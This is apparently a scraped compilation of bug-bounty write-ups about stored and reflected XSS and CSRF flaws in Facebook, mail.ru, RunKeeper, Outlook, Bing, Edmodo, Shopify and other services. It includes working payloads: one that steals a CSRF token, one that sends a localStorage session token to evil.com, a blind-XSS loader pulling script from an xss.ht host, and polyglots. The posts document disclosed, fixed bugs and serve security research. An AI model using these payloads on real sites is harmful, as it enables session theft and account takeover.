DENY or SAMEORIGIN (we’re still cross-origin at this point). This wasn’t too difficult to find - Facebook has various plugins which are meant to be placed inside an <iframe> . We can use the Page Plugin . It sets the document.domain property, and also contains fb_dtsg (the CSRF token Facebook uses). What we now need to do is load the plugin inside an iframe, wait for the onload event to fire, and extract the token from the content. document . domain = ' facebook.com ' ; var i = document . createElement ( ' iframe ' ); i . setAttribute ( ' id ' , ' i ' ); i . setAttribute ( ' style ' , ' visibility:hidden;width:0px;height:0px; ' ); i . setAttribute ( ' src ' , ' https://www.facebook.com/v2.4/plugins/page.php?adapt_container_width=true&app_id=113869198637480&channel=https%3A%2F%2Fs-static.ak.facebook.com%2Fconnect%2Fxd_arbiter%2FX9pYjJn4xhW.js%3Fversion%3D41%23cb%3Df365065abc%26domain%3Ddevelopers.facebook.com%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff366e4bcac%26relation%3Dparent.parent&container_width=588&hide_cover=false&href=https%3A%2F%2Fwww.facebook.com%2Ffacebook&locale=en_GB&sdk=joey&show_facepile=true&show_posts=true&small_header=false ' ); i . onload = function (){ alert ( document . domain + \" \\n fb_dtsg: \" + i . contentWindow . document . getElementsByName ( ' fb_dtsg ' )[ 0 ]. value ); }; document . body . appendChild ( i ); Notice how the alert box now shows facebook.com , not photos.facebook.com . We now have access to the user’s CSRF token, which means we can make arbitrary requests on their behalf (such as posting a status, etc). It’s also possible to issue XHR requests via the iframe to extract data from www.facebook.com (rather than blindly post data with the token). So it turns out an XSS on the CDN can do pretty much everything that one on the main site can. Fix Facebook quickly hot-fixed the issue by removing the forward DNS entry for photo.facebook.com . Whilst the content type issue still exists, it’s a lot less severe since the files are hosted on a sandboxed domain. Bonus ASCII Art One easter-egg I found was that if you append .txt or .html to the URL (rather than replace the file extension), you get a cool ASCII art version of the image. This also works for images on Instagram (since they share the same CDN).

What is mail.ru? mail.ru is a Russian mailing services like yahoo, hotmail and gmail. Mail.Ru Group, ООО (commonly referred to as Mail.Ru) is a Russian Internet company. It was started in 1998 as an e-mail service and went on to become a major corporate figure in the Russian-speaking segment of the Internet. As of 2013 according to comScore, websites owned by Mail.ru collectively had the largest audience in Russia and captured the most screen time. Mail.Ru’s sites reach approximately 86% of Russian Internet users on a monthly basis and the company is in the top 5 of largest Internet companies, based on the number of total pages viewed. Mail.ru controls the 3 largest Russian social networking sites. It operates the second and third most popular Russian social networking sites, Odnoklassniki and Moi Mir, respectively. Mail.ru holds 100% of shares of Russia’s most popular social network VKontakte and minority stakes in Qiwi, formerly OE Investments (15.04%). It also operates two instant messaging networks (Mail.Ru Agent and ICQ), an e-mail service and Internet portal Mail.ru, as well as a number of online games. What is Cross-site scripting AKA XSS? And why ours is stored? Cross-site scripting simply is a security bug that may affect websites allowing users (Attackers) to inject scripts (javascript) to another users (Victims) to modify or steal there data as example, session emails passwords page content. Stored Cross-site scripting is an XSS type which if successfully injected it will be stored permanently in the application’s database and retrieved whenever the user call back a vulnerable page calling this stored payload What is eml files? Used by many email clients including Novell GroupWise, Microsoft Outlook Express, Lotus notes, Windows Mail, Mozilla Thunderbird, and Postbox. .eml files contain the email contents as plain text in MIME format, containing the email header and body, including attachments in one or more of several formats. Now lets back to mail.ru bug…. Mail.ru is parsing .eml files and fetches the “subject” automatically then reflecting it in the email subject without sanitizing, filtering or validating it for malicious content which was the main root cause for our Stored XSS to occur. So to reproduce this behavior, We simply created a new eml file “test.eml”, Edited this file and included a simple XSS payload ie. “subject : <script>alert(“XSS”);</script>” then we saved the file, After that we went to we navigated to “m.mail.ru” (the mobile version of mail.ru), Created a new mail, uploaded the eml file and then we hit “send” Once a victim receive our malicious message, Opening it, you will find this lovely and cute popup alert box with word “XSS” inside it which mean that the script has been executed so that’s mean XSS occurs. Impact of a simple attack scenario: Imagine that an XSS work behavior which spreads over your mail.ru contacts, send the same malicious message to all of your contact with a JS execution of stealing user’s session and act on behalf of the currently logged in user! And possibilities are endless here. PoC Video: We responsibly disclosed the vulnerability to Mail.ru through their HackerOne bug bounty program and they fixed it and rewarded us with a generous bounty, Thanks Mail.ru Original source of the report: https://hackerone.com/reports/116570 Hey!

Mohamed A. Baset comment 4 Comments access_time 4 min read RunKeeper is a GPS fitness-tracking app for iOS and Android with over 40 million users. First launched in 2008 by CEO Jason Jacobs with the help of “moonlighting engineers”. In late 2011 RunKeeper secured $10 million in a Series B financing, led by Spark Capital. In February, 2016, RunKeeper was acquired by ASICS. In May 2016, the RunKeeper software came to the attention of the Norwegian Consumer Council for breaching European data protection laws. It is alleged to continue tracking user’s locations after the application is terminated and to share this information with advertisers in ways that exceed the bounds of the application’s terms and conditions. . About the discovered vulnerabilities: 1. Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws . 2. Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. . The bug(s): In the proof of concept scenario we found 2 issues, First a stored cross site scripting affecting “RunKeeper user profile name” where the payload is stored in the database and will be reflected whenever the public user profile page called by any user, Sometimes a stored cross site scripting issue is more sever than a SQLi which results in accessing a fully encrypted user data, Second a site-wide cross site request forgery where users can follow other users via a GET request (since the website is suffering from CSRF issues allover its parts)! .. CSRF PoC Code: https://runkeeper.com/ relationship ?request=& target = 36973602 . PoC Video and attack scenario: . Notes on the attack scenario: As you may noticed in the PoC Video our XSS payload was used to perform a follow request to the owner of the vulnerable profile which turn it into a site-wide XSS Worm behaviour, In the worst scenario we can use this Stored XSS to inject our payload on any potential profile visits ours. Also we shortened the XSS payload using google shortening service since there is a payload length limitation and the payload reflection in the page source context won’t be executed if it exceeds the limit! We are aware that a stored XSS can simulate mouse clicks, Reading the anti-csrf token and perform form submits, etc… but we tried here to merge two attacks to demonstrate how attackers are able to perform a more severe impact. . Differentiation: We spotted the vulnerability without the knowledge of it’s existence before, the issue was originally reported by security researcher David Sopas and was fixed on Nov 12, 2013 On Oct 10, 2015 Seekurity team tried to give it another shot while doing some investigations to be sure if we can relay on the service for a personal use we were able to bypass the fix made by RunKeeper Security team. . The Fix: RunKeeper Security Team mitigated the issue root cause totally by doing a proper user input validation and an Anti-CSRF tokened requests! . . Hey! Building a website? Or already built a one?

Written by omespino March 14, 2019 March 29, 2022 WRITE UP – $1,000 USD, XSS STORED IN OUTLOOK.COM (IOS BROWSERS) Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about the Microsoft bug bounty program and why you can always check the basic payloads because you will surprise that some times will work: SPOILER ALERT: I highly recommend Miscrosoft Bug Bounty Program , in my experience their program is much better compared with another big companies programs This blogpost appeared first in the book Bug Bounty Write Ups Collection Title: XSS Stored on outlook.com (iOS) via doc file. Product / URL: ​ outlook.com iOS browser (Google chrome) Report sent via secure@microsoft.com Hi ​Microsoft Security team. I’ve found a XSS ​stored ​ in​ ​outlook.live.com ​in iOS ​ browsers via msoffice (ppt) file. POC: 1.- Create a msoffice document per example a power point presentation with an hyperlink pointing to the url address “javascript:prompt(document.cookie)” and save as “Powerpoint presentation 97-2003 Presentation”, Is very important save the doc as 97-2003, if you don’t save the document as this version the bug reproduction may not work. 2.- Login ​in​ to ​outlook.live.com ​(outlook email)​, upload to msoffice ppt file ​and send the file via email. 3.- ​ Login into ​outlook.live.com ​(outlook email)​ in Google chrome iOS browser, open the email with the special crafted document, click the attachment and then click download, after that the document ppt will render in Google chrome ​,​ ​then click the hyperlink and see the XSS (shows up the document.cookie). ​ Something important to highlight is: At this time you have a “magic” link that points directly to the ppt special crafted document. ​ ​4​ .- Open the link directly ​in Chrome iOS browser, click the hyperlink, and ​ see​ the XSS(shows up ​again ​ the document.cookie) ​, ​ if you open the link in any iOS browser like Safari, Firefox, Chrome, Opera the XSS works, you just need to be logged in your ​outlook account, only works in iOS). Impact Stored XSS allows an attacker to embed a malicious and arbitraries scripts into a vulnerable page, which is then executed when a victim views the page. Environment iPhone 6 – iOS v11.2.5. ​Safari Lastest version Google Chrome Lastest version ​My personal email account and all testing was seding emails to myself.

Local Storage. Its easy to steal this Local stored data through javascript localStorage.getItem() function. lets alert this data through console for demonstration. Payload : alert(localStorage.getItem('access_token')) Simple Example through Console I have found same challenge previously on bugcrowd private program. Authorisation token was responsible to handle web application session but they are storing that authorisation token in local storage. which is not a good way to protect session tokens. So i manged to find Stored XSS on that program and that XSS is getting executed on Admin Account. Bingo !! 😜 it take me 2 min to craft payload and steal that authorisation token. ezpz 😎 I submitted that vulnerability as Stored XSS to Admin Account Takeover. 😅 Final Payload : <img src=x onerror=\"document.location='https://evil.com?key='+window.localStorage.getItem('simple_auth:session')\"> JavaScript will pickup local storage data and concat it to end of the string at the time of onerror event handler execution. after that it will redirect to evil.com with data. i.e local stored data. Redirection towards attackers server. Attacker server received Local Stored data Note : it's recommended not to store sensitive information in local storage. 😂 Bounty awarded : $800 (Happy with it) 😄 Thanks for Readings .. 💜💜💚 Get link Facebook X Pinterest Email Other Apps Comments Smaran 27 April 2019 at 05:30 Nice one brother.

(XSS and CSRF in Bing) Sai Krishna Kothapalli 3 min read · Jun 10, 2016 -- 1 Listen Share Hello !! This post will be about my 4th and 5th valid bug reports I submitted to Microsoft. Open the Images in a new tab if you find them difficult to view. I took the screenshots in a 1080p screen. This time I have found a XSS and CSRF vulnerabilities in Bing . Bing images is testing 3 new features called Stream , Favorites , Trending which are still in beta. Bing Images So I was going through this and there is this option where you can search and directly add images to your favourites. It was cool, So I wanted to take a look at how it is implemented. When you click on the heart symbol after the image search, the image is added to your favourites. and the request looks like this It’s URL-Encoded. Once decoded it looks like this {“WriteNewCollection”:true,”query”:”lucianazogbi”,”mid”:”5689B0BFCDB0E64E595A3B6C2B7A0865A4DC236C”,”description”:”lucianazogbi”,”MediaUrl”:”https://beautifulgeniuses.files.wordpress.com/2015/01/lucianazogbi.jpg&#8221;,”SourceUrl”:”http://beautifulgeniuses.com/2015/01/14/lucianazogbi/&#8221;,”ThWidth”:300,”ThHeight”:300,”MediaWidth”:640,”MediaHeight”:640,”MD5″:”md5_5c6aa5d2768f0d2255dab627015da340″,”MediaFormat”:””,”ThumbnailId”:“OIP.M5c6aa5d2768f0d2255dab627015da340o2″,”CollectionType”:0,”ContentId”:”XGql0naP”} Interesting there is no CSRF token and there is no X-Requested-With : XMLHttpRequest header. Which means it is vulnerable to CSRF attacks. Another interesting thing is the webpage is displaying this data in the Favorites tab. Then why not try to inject some JavaScript there. I tried all the fields but none of them worked. When I almost gave hope I saw this. This link is vulnerable to XSS . It is accepting links javascript:code in the <a> href tag . So when I click on it. BAMN Our favourite popup. So, by sending the user to a single malicious site it is possible to compromise his account. If I have stopped after the CSRF I would have not found the XSS. So, by successfully combining 2 vulnerabilities we made an exploit to compromise Bing. I reported this to Microsoft and now it is fixed. Since, that feature is still in beta-testing they took more than 5 months to fix that in order to make it more secure. My name will be in the March 2016 Hall Of Fame. Thank you for reading.

Mohamed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Hack Your Form-New vector for Blind XSS Youssef A. Mohamed 3 min read · Mar 12, 2019 -- Listen Share H ello Pentesters, I’m Youssef A. Mohamed aka GeneralEG Security Researcher @ CESPPA , Cyber Security Engineer @ Squnity and SRT Member @ Synack Press enter or click to view image in full size Today I’m gonna share a juicy finding with you. Talking about bypassing a couple of filters to execute malicious javascript codes easily and achieve a Blind Stored XSS. “I found this issue in a lot of targets so, I will take one of these programs as an example.” The program is private so let’s call it redacted.com Recently I was testing in this program and after some recon, I found that the website offers a specific service (Create Forms). How does this service work? 1)Creator User create a form 2)Creator User share the link with visitor 3)Visitor fill the form 4)The filled information will be available for the Form’s Creator at redacted.com/manager/{Form ID}/ So while testing the “Creating form” functions, I’ve found that there’s a Website input I made a simple form. Then opened as the form as a visitor. At the first I tried to bypass it as the basic style: (thought that if I wrote website.com?” payload it will execute) So, I entered: https://example.com/?\"%22&#34; ( “ + url encoded + html entities encoded) Then opened the creator account to see what happened. But unfortunately, the filter encoded the double quotes. https://example.com&quot;%22&amp;#34; and noticed that the Link rendered in (a tag) So, I decided to grab a cup of coffee :”D Press enter or click to view image in full size After a few minutes of deep thinking while drinking my coffee about how I will bypass this one. I decided to start fuzzing in this input especially.. {Enter Website} While I’m fuzzing I noticed that the filter accepted test:https://example.com ! then tried javascript:https//evil.com and it worked :D “Evil loud laugh” Now I’m sure that there’s XSS here but it’s need real website merged with my payload so i wrote this one. javascript:x=’http://x.c';alert('xss');// Finally executed! But wait we want to make it Blind XSS to attack the real admins (The best scenario). So the last payload was: javascript:eval(‘a=document.createElement(\\’script\\’);a.src=\\’https://generaleg.xss.ht\\';document.body.appendChild(a)');s='https://s.com' ¯\\_(ツ)_/¯ That’s it! Notes: 80% of my targets which have the Website’s input was vulnerable to the same scenario. To make sure that your target is vulnerable to the same problem you need a few steps to make sure: A. Check if the website is accepting other URI scheme like javascript:https://generaleg0x01.com or not? B. Check if the website is rendering your https://generaleg0x01.com on HTML ‘a’ tag or not? And in the most similar situations, the same payload will work perfectly. Timeline: 20 December, 2018: Report Submitted 25 December, 2018: Report Reviewed and Triaged 30 December, 2018: Report Resolved & 800$ Bounty Awarded Learned lessons: Fuzz as much as you can. Don’t try one technique to bypass the filter to try other techniques. Happy Hacking! Security Blindxss Cesppa Generaleg Bug Bounty -- -- Written by Youssef A.

This bug was found by me a month ago. Inspired the story of Parth Shah . He wrote an article based on Stored XSS . As I was surfing the edmodo.com website, I found two or more URLs at that point in time. There is nothing on that page except a login page and an outdated layout of the Edmodo website. I think let’s see if I can find anything on this page. I decided to capture the login request of that page after some time on Target URL: https://www.edmodo.com/bookmarklet-login When I opened this URL, I saw a login screen with a sky blue background. Here is a screenshot of the login page. However, nothing happened when I tried SQL and XSS Input. My next step was to dig deep into the application and check all parameters of the request after logging in. Press enter or click to view image in full size In the request, username, password, and login information are passed. All of these passes when the user logs in. However, I see there is a parameter called URL passed with the request. Press enter or click to view image in full size My mind goes into overdrive when the URL parameter is passed in the request! Now, I’m gonna try to put a string like “Test Example”. I will show the response and it will be reflected on the page. Inputs do not involve any validation or filtering. I tested other payloads and they were also set correctly. Likewise, the payload is also breaking the input tag on the response side. Special characters and XSS payloads will be accepted without any errors. Step to Generate XSS [Reflected]: Step - 1 : Open https://www.edmodo.com/bookmarklet-login . Enter the random username and password. Press enter or click to view image in full size Step - 2: Note the request. Note the “URL” parameter passing in the request. Press enter or click to view image in full size Step - 3: Put the url= ”/><script>alert(document.domain)</script. Press enter or click to view image in full size Step - 4: Check the response. the payload breaks the input tag on the response side. Press enter or click to view image in full size Step -5: Payload successfully executed Woooohooo…! Press enter or click to view image in full size My reaction after Successfully Executing Payload is like this..:P Finding a single vulnerability can take a lot of time and effort, but if you go too deep, something will definitely be found. I was very excited because it was my first valid bug. I always awaited a response from Edmodo. I immediately made a POC video and sent it to the team. The team was very responsive. The swag was delivered a few weeks later.

Blind XSS is a flavor of cross site scripting (XSS), in which the attacker “blindly” publishes a series of malicious payloads on web pages that are likely to keep them in a constant state (such as in the database or in the log). Press enter or click to view image in full size Currently I use the XSS hunter (Web version) to find out the Blind XSS. XSShunter: XSS Hunter is a recently launched platform that makes pen testing for XSS vulnerabilities much easier to monitor and organize. Through it you can launch all kinds of XSS attacks, but where it really shines is when carrying out a Blind XSS attack. Blind XSS for beginners I get a lot of DM’s in twitter asking questions about Blind XSS like which tool to use, how to register in XSShunter… medium.com Step 1: To create a new rule, as none of the pre-defined ones does what we need, click “Add”, and you’ll see the new rule dialogue appear. Click the “Type” drop-down and click “Request header”. Then, add ^Referer.*$ as the “Match” criteria. This string is a regular expression that matches on any header string that starts with Referer. As there should be only one, if any, then a simple match is all we need. Next, set the “Replace” text as Referer: “><script src= https://newone.xss.ht ></script>. Then, check the “Regex match” checkbox, and click “OK”. Press enter or click to view image in full size Matthew Setter When you're testing web applications, sometimes you want to automatically change some part (or parts) of the request… www.matthewsetter.com Step 2: When the response is intercepted, you will see in “Raw” request, that the Referer: “><script src= https://newone.xss.ht ></script> has been replaced!, as in the image below.

It looks cool and everyone says that, it is cross site scripting bug. So, I assumed there is lots of XSS. Edmodo is a very secure platform and edmodo is very serious about security, so I decided to hunt . Even leet hunter Prial Islam Khan shared image of his edmodo swag, that inspired me a lot. Press enter or click to view image in full size Screenshot from https://prial.me/acknowledgements.html So, I decided to test Edmodo. But, I am a noob. How can I find the bug? yeah, I can. If I can that means anyone can. What is my methodology? Is that simple steps or any l33ty automation tool. Nope, it’s just manual.. too manual. As I said, I am a noob.. so tried very noob way to hunt. I filled all fields with XSS payloads with hope to get an XSS and cool swag ❤. How I got the bug? As I said all fields are filled with XSS. I was hoping for the pop up and got nothing. But, hope (believe) is always there with me. I read Arbaz Hussain ’s ( kiraak-boy ) post, where he advised to give time to all program before loosing hope. Link to the post: https://medium.com/@arbazhussain/10-rules-of-bug-bounty-65082473ab8c So, I decided to start finding bugs on edmodo subdomains. I used a tool named sublist3r (coded by Ahmed Aboul-ela) to find subdomains. Link to the tool: https://github.com/aboul3la/Sublist3r Then? then I just opened beta.edmodo.com and boom XSS popped. I started to find the injection point and it’s on the status post. How I got the payload? May be people are thinking, even some people already asked me about the payload I used.. It’s not mine. I used an XSS polyglot crafted by XSS King Ashar Javed. Here is the payload, \">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">) I used this payload initially then removed unnecessary parts while making PoC video. Twitter Status: Note: This is my first medium post. So, feel free to comment to give advice about this write up and correct me (even grammar mistakes). btw, the bug was found long time ago, so I described methodology from my memory.

Description : the domain https://photos.shopify.com/ is one of Shopify gallery site to share photos and information about event etc, so the first thing that i did to understand the site shows the source of the page and by looking inside it i notice that every image has a parameter `pid` which contains information about the ID of the image and it’s included at the image TAG. this something good if you trying to find a hidden parameter to test an XSS attack or content injected at the site. so by adding this parameter to the end of the link and put this payload as the value for it javascript:alert(\"modam3r\"). Press enter or click to view image in full size the XSS was run successfully for the first time, I was thinking that this kind of hidden parameter but after doing more search and try a random different parameter, collect that the site accepts any parameter and it returns with the value of it inside the `img` TAG, so any payload will be run successfully as I think. i send the report to Shopify and after one day i got this response Press enter or click to view image in full size so I moved and send the report to pixieset.com team about this, and they fixed the bug without any response to my report or give any bounty ^_^. Results or tips: always look for a hidden parameter, and try to use random parameters that maybe return with something good to you. keep in mind not all report will return with bounty sometimes it’s return with Disappointment. Time Line: 11–02–2018 report send to Shopify . 12–02–2018 team response and closed as Informative. 12–02–2018 report send again to pixieset.com team with full details. 21–02–2019 the bug was fix by pixieset.com without any response from them. @modam3r5 Security -- -- 3 Written by Modam3r5 52 followers · 2 following just another security research [Ly] Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Hi guys, | by Futaacm Cyber | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS on Edmodo Futaacm Cyber 4 min read · Feb 18, 2019 -- 1 Listen Share Hi guys, Today i will be sharing about the exploit i found in Edmodo which could have allowed me to take over the account of any user of my choice. About the target? Edmodo is an educational technology company offering a communication, collaboration, and coaching platform to K-12 schools and teachers. The Edmodo network enables teachers to share content, distribute quizzes, assignments, and manage communication with students, colleagues, and parents. Let’s get started!!! So I saw a post on twitter where some guys posted about the swag they got from edmodo and I decided to try my luck out probably I might be able to find something. Below I will be talking about one of the bug I found on this target. Reconnaissance I visited the website and signed up as a normal user, I tried playing around the application for a while trying to understand the work flow of the application before creating another account which I will be using for attacking. After playing with the application for a while, I thought I understood the application and I was set to attacking it which happened to the biggest lie of all time. Thinking i was set to attack, so I decided to create a new account which I will be using to attack. To sign up on this application, the application takes you through four stages which are: Stage 1: The application ask you for your email and password Stage 2: The application ask you for your first name and last name. (This is the vulnerable endpoint) Stage 3: The application ask you for the school you will be teaching from Stage 4: The application ask you to link your other social media account with your edmodo account. The Exploit In the first stage, I filled in the form as required, i entered my email and password, then I was redirected to the second stage where I was asked for my firstname and lastname, this was where I injected my payload, I used <img src=x onerror=alert(1)> as the firstname and the same as the lastname, luckily for me my payload slipped through without being filtered or rejected by the server, at this stage I was already dancing. my current mood I filled the rest of the forms as required then I got logged in to my account. Upon logging in I was a bit disappointed, I was expecting my payload to be executed in the home page since my first name and last name were reflected their, instead of being executed as a script, they were reflected as a raw text, I checked my profile page probably I might get lucky and my payload will be executed their but still no luck, at this stage I was getting discouraged. me feeling discouraged I tried for couple of days to get it work but damn!!, I got nothing, this is where my insufficient reconnaissance showed but I was determined to make it work, as the infosec community always say #TryHarder which is what I did, on one faithful day, I was playing with the application again then I searched for my Account A from my Account B, I found my other Account A and I sent a connection request from my Account B to my Account A and I logged in to my Account A and I accepted the request, I viewed my Profile, I saw I had a new connection, I clicked on the connection tag and Boom!!! my payload was executed. At this stage I didn’t know how to feel because I have being trying to make this work for days and finally It worked, straight away I reported the bug, I didn’t try exploiting it further because I didn’t want to get a “duplicate report” response and which sadly for me that was what I got. But it’s good, I did learn something from exploiting the application which is: “Reconnaissance is the key” and “Being persistence pays off”.

DOMPurify works with a secure… github.com Any defensive research could be used in offensive purposes. DOMPurify has great XSS tests with descriptions . These tests were sourced from real DOMPurify bypasses . Moreover, DOMPurify prevents XSS in all browsers and is aware of browser-specific behaviors. So, these XSS payloads are good. # XSS Payloads I’ve used XSS payloads from DOMPurify 😃 # XSS Fires in applewebdata: origin on email opening — <svg onload=alert()// 2. Fires on click in applewebdata: origin (🤦‍♀) <a href=\"javascript:alert()\"> 3.

Even if I’ve found a 4th XSS, it’d be likely have been considered as a duplicate. # Impact It wasn’t possible to escalate these XSS into RCE/LFI. At least, I didn’t find such a way. JS execution via email is already an issue. Privacy violation: track when the user opens the email, disclose IP, leak other info. Phishing via prompt(), alert() “Useless” UXSS Press enter or click to view image in full size # applewebdata:// origin is useless Initially, I thought that XSSs in applewebdata: should allow reading local files. There was CVE-2016–1764 (XSS in iMessage via javascript: URI) that allows reading local files. applewebdata: was also highlighted in browser security research (UXSS) — https://runic.pl/hitb-ios-browsers.pdf . Local files reading would be pretty impactful for a mail app. However, this flaw was patched in Webkit(?) and now applewebdata: allows only doing UXSS in this particular case. Anyway, UXSS is better than no UXSS, at least some privileged context :( Additionally, Webkit forbids requests to file:// origin.

At first, ProtonMail security team reacted quickly, but then they disappeared for a while. There was a small miscommunication on their side.

I found this cool bug and wanted to share, so here it goes. So after going through a private program on hackerone, i found a Self-XSS[AngularJS Template Injection] and a misconfigured OAuth implementation with low impacts. These 2 bugs alone wouldn’t have a great impact but if chained together, will lead to a Perfect Stored XSS! Let’s call the application redacted.com for obvious reasons. To give a background of redacted.com, it’s file storage service just like Google Drive or DropBox. User can upload, download, share their files from this platform. I found XSS on the name of file being uploaded. So a file name like {{constructor.constructor(‘alert(1)’)()}}.jpg will result in XSS on the uploaded files dashboard. Cool! But it’s Self XSS . There’s an easy way i found to make it Stored XSS on other users just by sharing the link to file and the file get’s imported in there uploaded files dashboard with the name unchanged, thus resulting in Stored XSS but i’ll show you one more interesting way i found to do this. In settings, i found a feature to import your files from DropBox. To do that, you need to connect the application to your Dropbox account using OAuth. I’ll quickly explain the OAuth flow of this application. So first, user clicks on connect Dropbox button and a GET request is initiated like this ( https://dropbox.com/oauth2/authorize?client_id=***********&response_type=code&state=****************&redirect_uri=https%3A%2F%2Fwww.redacted.com%2Faccount%2Fsettings%2Fdropbox-callback ). Then user is redirected to Dropbox, logins and click on Allow. 3. Just after clicking Allow, a GET Request containing the state parameter and auth_code is being sent to redacted.com as can be seen in Location header below. Press enter or click to view image in full size 4. As soon as this GET Request is executed on redacted.com, Dropbox get’s synced with current user session and all files from it can be imported to redacted.com. So i started testing this OAuth flow. The goal was to somehow connect my Dropbox account to other redacted.com users but found that everything is in place. The redirect_uri was perfectly whitelisted, state parameter was there as well, can’t use the auth_code twice etc. But still i tested the state parameter that whether the application was verifying it with current user session and found that it was verifying. So, I can’t use the final URL coming from Dropbox ( https://www.redacted.com/account/settings/dropbox-callback?state=********code=********** ) on other redacted.com users account. Than what’s WRONG? Out of curiosity i removed the state parameter from URL( https://www.redacted.com/account/settings/dropbox-callback?code=********** ) and used it in different user account and surprisingly, my Dropbox account was connected to that user. So basically i can connect my Dropbox account with anyone’s redacted.com account with just a GET request. But you might be wondering, what good is that? There wasn’t any option to login to redacted.com using Dropbox account so account takeover is not possible using it. But since i knew there’s already a XSS in file name, i took advantage of this OAuth misconfig. EXPLOIT SCENARIO Uploaded a file with name {{constructor.constructor(‘alert(1)’)()}}.jpg on Dropbox(strangely it was allowed). Give the final OAuth URL without state parameter from Dropbox to victim ( https://www.redacted.com/account/settings/dropbox-callback?code=********** ) Victim’s gets connected to our Dropbox account and imports all the files from Dropbox including the malicious file. When user visits Uploaded File Dashboard, our XSS payload in file name will be executed So although the server was verifying the state parameter with current user session, but it wasn’t verifying the presence of it. We can assume the server logic to be something like : if(isset($_GET['state'])){ if($_GET['state'] != current_user_state) ACCESS DENIED exit() } ACCESS GRANTED T hat’s it, a tricky way to bypass OAuth implementation and achieving stored XSS in an interesting way.

In this story, I will be telling how a flash file led me to an XSS — however, I will not be disclosing the website due to their privacy and respect. 😊 Let’s start. You will need an XSS swf. That XSS swf file can be obtained through: https://github.com/evilcos/xss.swf — download the file and then upload to the server you’re testing on for Bounty Hunting!! Once you see the file is on the server and doesn’t ask you to download/reflects on the server, that’s when you put your XSS code. Simply add ?js=alert(document.domain); at the end of your .swf and it should display the XSS. Screenshots: Press enter or click to view image in full size As you can see, the x.swf file stays on the server. Press enter or click to view image in full size Adding ?js=alert(document.domain); triggered my XSS. Time and date for payout: Mon, Oct 29, 2018 10:51 AM - XSS found and reported the same day. Wed, Oct 31, 2018, 9:56 AM - An investigation was done by their security team. Nov 19, 2018, 8:18 AM - Payout of $200 USD was sent to my PayPal.

Parth Shah 2 min read · Jan 4, 2019 -- 1 Listen Share Hello bug hunters,this is my first story so pardon my English. I found this bug a few months back.I am grateful to the community as I have learned every damn thing from the community.I found this bug in Edmodo as who doesn’t want a swag for showing off in front of friends :).So Lets start the story. So the first step was reading what others have found so I save my time not to find them and I realized most of the bugs were reported by them.I was a bit disappointed but I had decided to find a vulnerability.So I started visiting the website and inserting XSS payloads in almost any and every input field but nothing popped up,checked for csrf,idor but all of them failed I was like It was late at night I thought of quitting and going to sleep I decided to test for last functionality of adding students in a group created by teacher.So i added XSS payload in first name and last name of the student and added it.As usual nothing happened.I was frustrated af.I decided to delete my account and everything and quit the target.So I started from deleting the student created from XSS Payload and BAAMMM! I got alert payload.I wasn’t able to believe I got my life’s first alert box. Press enter or click to view image in full size I was very happy as I got first valid bug of my life.I wasn’t able to sleep properly.I immediately made a POC video and sent to the team.They were very responsive.After few weeks I recieved the swag PS: This bug wasn’t intentional but the amount of hard work and time I put in the website made it worthy. Takeaways:- Always dig deeper in web application.There is always something fruitful. Always check each and every functionality and input. Main thing is never give up,I was going to give up and I found this. Thank you for reading this.Focusing now more on reward based programs.Any suggestions are welcome.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSSing Google Code-in thanks to improperly escaped JSON data - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me XSSing Google Code-in thanks to improperly escaped JSON data by Thomas Orlita Vulnerabilities December 14, 2018 February 16, 2022 Google Code-in is an online programming competition for students hosted by Google that takes place every year. When I was signing up for a second time, I put a payload into all the text fields. I didn’t expect anything to happen, but when I clicked the submit button, all the payloads were executed. And the payloads continued executing on every page I visited. This alone didn’t mean much as it would only classify as a self-XSS but meant that this didn’t have to be the only place the payload was improperly shown on the page. I submitted this bug to the support email and also to Google VRP in case it turns out to be a real issue. In Google Code-in you can submit tasks for review and also can add comments to them. And as usual, I put the payload in the comment. Surprisingly, when I added the comment, the payload worked once again. And it stayed there even after I reloaded the page. I sent an update to Google and they fixed it the following day. The Payload Now let’s take a look at what happened with the payload. They used script elements with type application/json generated on the backend to pass user data to the client-side. <script type=\"application/json\"> {\"someData\": true, \"text\": \"hello world\", \"user\": 123} </script> In the comment and other fields I used a simple payload like this: \"'><script src=x></script>{{1-1}} When a new comment is sent, it’s also added to the JSON object which holds the comments of a task as well as some other data. So when the comment was added, the JSON would look something like this: <script type=\"application/json\"> { \"someData\": true, \"comments\": [{ \"id\": 123, \"text\": \"\\\"'><script src=x></script>{{1-1}}\" }] } </script> As you can see, the double quote is escaped correctly and it’s a perfectly valid JSON. Except… they forgot to escape one important thing. Parsing Context As written in the HTML4 documentation : The first occurrence of the character sequence “</” (end-tag open delimiter) is treated as terminating the end of the element’s content. In valid documents, this would be the end tag for the element. This means as soon as the HTML parser sees </script> , it assumes it is the end of that element. We get even more info in the appendix 